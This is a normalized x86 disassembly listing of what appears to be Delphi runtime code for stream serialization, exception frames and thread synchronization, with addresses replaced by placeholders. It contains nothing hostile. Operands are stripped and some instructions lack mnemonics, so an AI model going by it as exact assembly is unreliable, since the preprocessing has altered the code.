mov eax [ ebp - 0x4 ]
call sub_4186c0
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cf8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186c0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416d78
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cf8
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4176d0
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417c14
pop ecx
jmp r-xdata
sub_418078
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403fb0
jmp r-xdata
mov eax [ ebx ]
call sub_4134a4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4180d8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4183f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4184c0
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4183d1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418392
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
mov eax [ ebp - 0x1c ]
call sub_413078
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_418078
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40316c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412dc8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418337
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405cc8
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4137bc
xor eax eax
push ebp
push sub_418317
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413974
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41831e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403224
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413918
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_418368
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a14
jmp r-xdata
call sub_4039c0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41646c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183d8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418397
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416614
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4039c0
call sub_403a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183d8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403224
sub_418404
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4184ae
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418481
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4186c0
cmp al 0xb
je r-xdata
mov eax ebx
call sub_41067c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41675c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416794
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184b5
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_4184e4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416c84
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40404c
mov eax esi
call j_sub_404428
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416c84
pop edx
pop esi
pop ebx
retn
sub_418520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4185cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416c60
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4185dc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041e4
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185d4
lea eax [ ebp - 0x8 ]
call sub_40463c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4186c0
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416c84
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045a8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416c84
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416c84
jmp r-xdata
jmp r-xdata
call sub_41675c
sub_4185dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4186b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416c60
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418520
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404788
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186ba
lea eax [ ebp - 0xc ]
call sub_403f5c
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4186c0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416c84
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404884
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_416c84
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416c84
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045a8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416c84
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405968
jmp r-xdata
jmp r-xdata
call sub_41675c
sub_4186d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418710
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4184e4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418717
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_41871c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41691c
test al al
je r-xdata
mov eax [ ebx ]
call sub_4187d0
mov eax [ ebx ]
call sub_417888
pop ebx
pop ebp
retn
sub_418744
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416c84
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418bc8
pop ebx
pop ecx
pop ebp
retn
sub_418774
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41691c
test al al
je r-xdata
mov eax [ ebx ]
call sub_416c60
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417888
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418bc8
jmp r-xdata
mov eax [ ebx ]
call sub_4187d0
mov eax [ ebx ]
call sub_41691c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41896c
mov eax [ ebx ]
call sub_417888
sub_4187d0
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41895f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4186c0
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418966
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
jmp [ eax * 4 + jump_table_418807 ]
push ebp
call sub_41871c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4184e4
jmp r-xdata
push ebp
mov eax 0x1
call sub_418744
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186d4
jmp r-xdata
push ebp
mov eax 0x1
call sub_418744
pop ecx
jmp r-xdata
push ebp
call sub_418774
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
push ebp
mov eax 0x2
call sub_418744
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418bc8
jmp r-xdata
push ebp
mov eax 0x1
call sub_418744
pop ecx
sub_41896c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4189a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4184e4
mov eax ebx
call sub_4187d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189b0
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_4189b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_418a4c
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41691c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4184e4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4184e4
jmp r-xdata
mov eax ebx
call sub_41896c
mov eax ebx
call sub_417888
jmp r-xdata
mov eax ebx
call sub_41691c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4189b4
mov eax ebx
call sub_417888
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a53
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f80
retn
sub_418a5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418b01
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403ff4
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4198f8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b08
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
sub_418b2c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418b54
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416bb4
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_412fb8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403438
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416bb4
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418bc8
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_416c84
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_416c84
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418c10
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418db9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4167e8
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418d94
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416c84
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415714
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_416c84
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160a4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418d6f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418520
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_416c84
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415714
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_416c84
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_41031c
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
lea eax [ ebp - 0x1c ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cd04
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d76
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub_418dd8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418fd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e878
mov eax [ ebp - 0x4 ]
call sub_416c60
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
jmp [ eax * 4 + jump_table_418e1a ]
mov eax [ ebp - 0x4 ]
call sub_4186c0
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177d0
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fb54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177d0
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fb54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177d0
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fb54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175b4
mov eax ebx
call sub_40fbe4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175f8
mov eax ebx
call sub_40fbe4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41763c
mov eax ebx
call sub_40fc0c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41768c
mov eax ebx
call sub_40fbf8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418520
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fc20
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4185dc
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fc4c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186c0
cmp al 0x9
sete dl
mov eax ebx
call sub_40fbbc
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418c10
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eba0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41783c
push edx
push eax
mov eax ebx
call sub_40fb90
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418fd9
lea eax [ ebp - 0x1c ]
call sub_40e88c
lea eax [ ebp - 0xc ]
call sub_40463c
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov eax ebx
call sub_410404
jmp r-xdata
sub_418fe0
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41902c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_419058
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4191c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418fe0
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4191c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418fe0
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4191c8
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_418fe0
jmp r-xdata
pop edx
pop ebx
retn
sub_4190dc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404368
je r-xdata
mov eax esi
call sub_40421c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40421c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4191c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418fe0
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_418fe0
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4191c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418fe0
mov dl 0x6
mov eax ebx
call sub_4191c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418fe0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_418fe0
sub_419174
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4191b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a0c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4190dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191c0
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_419250
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
call sub_419228
mov eax ebx
call sub_419234
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4193de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4193bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193c6
mov eax [ ebp - 0xc ]
call sub_403224
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413918
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413808
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419389
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41935a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
